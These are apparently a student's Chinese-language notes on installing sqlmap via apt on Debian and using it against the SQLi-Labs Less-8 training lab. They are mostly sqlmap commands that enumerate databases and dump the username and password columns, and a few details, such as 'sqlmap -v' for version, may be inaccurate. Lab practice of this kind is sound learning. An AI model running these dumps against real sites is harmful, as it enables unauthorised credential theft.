# Debian Apt 版 Sqlmap 笔记整理



#### 一、安装与验证（核心步骤）

|操作|命令|说明|
|---|---|---|
|更新软件源|`sudo apt update`|确保能获取最新的 sqlmap 安装包|
|安装 sqlmap|`sudo apt install sqlmap -y`|从 Debian 官方源安装（版本可能略旧，但稳定）|
|验证安装|`sqlmap -v`|显示版本信息即安装成功；`sqlmap -h` 可查看帮助|
|卸载（如需）|`sudo apt remove sqlmap -y`|彻底卸载 apt 版 sqlmap|
#### 二、核心使用命令（适配 SQLi-Labs Less-8）

基础URL：`http://127.0.0.1/sqli-labs/Less-8/?id=1`（替换为你的靶机地址）

通用参数：`--batch`（自动选择默认选项，无需手动交互）

|应用场景|完整命令|参数核心作用|
|---|---|---|
|检测注入点 & 验证类型|`sqlmap -u "http://127.0.0.1/sqli-labs/Less-8/?id=1" --batch`|`-u`：指定目标URL；自动识别布尔盲注类型|
|枚举所有数据库名|`sqlmap -u "目标URL" --batch --dbs`|`--dbs`：列出MySQL中所有数据库|
|枚举指定数据库的表|`sqlmap -u "目标URL" --batch -D security --tables`|`-D`：指定数据库名；`--tables`：列出该库下所有表|
|枚举指定表的列|`sqlmap -u "目标URL" --batch -D security -T users --columns`|`-T`：指定表名；`--columns`：列出该表下所有列|
|导出指定列的数据|`sqlmap -u "目标URL" --batch -D security -T users -C username,password --dump`|`-C`：指定列名（多列用逗号分隔）；`--dump`：导出数据|
|多线程加速执行|`sqlmap -u "目标URL" --batch --threads 8 -D security --tables`|`--threads 8`：8线程（Debian建议5-10线程，避免资源耗尽）|
#### 三、Debian apt 版专属注意事项

1. **权限问题**：

    - 执行命令若提示 `Permission denied`，加 `sudo`：`sudo sqlmap -u 目标URL --batch`；

    - apt 安装的 sqlmap 为系统全局命令，无需进入特定目录。

2. **版本兼容**：

    - Debian 系统 apt 版 sqlmap 已适配系统默认 Python 环境，无需手动指定 `python3`，直接用 `sqlmap` 命令即可；

    - 若出现语法报错，可执行 `sudo apt upgrade sqlmap` 更新到源内最新版本。

3. **网络适配**：

    - 靶机为本地虚拟机时，确保 Debian 与靶机网络互通（如桥接模式），URL 用靶机内网 IP（如 `192.168.1.100`）而非 `127.0.0.1`。

#### 四、完整实操示例（Less-8 实战）

```Bash

# 1. 检测 Less-8 注入点
sudo sqlmap -u "http://192.168.1.100/sqli-labs/Less-8/?id=1" --batch

# 2. 导出 security 库 users 表的账号密码
sudo sqlmap -u "http://192.168.1.100/sqli-labs/Less-8/?id=1" --batch -D security -T users -C username,password --dump
```

### 总结

1. apt 版 sqlmap 为 Debian 系统全局命令，无需额外配置 Python 环境，直接执行 `sqlmap` 即可；

2. 核心参数与通用版一致：`-u` 指定URL、`-D/-T/-C` 指定库/表/列、`--dump` 导出数据；

3. 权限不足时加 `sudo`，多线程建议 5-10 线程适配 Debian 系统资源。
> （注：文档部分内容可能由 AI 生成）
